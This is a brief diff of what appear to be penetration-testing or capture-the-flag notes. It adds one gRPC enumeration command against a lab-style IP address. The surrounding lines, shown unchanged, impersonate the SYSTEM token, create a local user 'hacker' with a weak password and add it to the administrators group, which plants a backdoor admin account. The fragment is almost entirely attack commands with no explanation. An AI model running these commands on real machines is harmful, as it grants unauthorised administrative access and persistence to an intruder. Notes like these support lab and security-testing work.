@@ -32,3 +32,4 @@ impersonate_token "NT AUTHORITY\SYSTEM"
 net user hacker Password123! /add
 net localgroup administrators hacker /add
 
+grpcurl -plaintext 10.129.10.206:50051 list
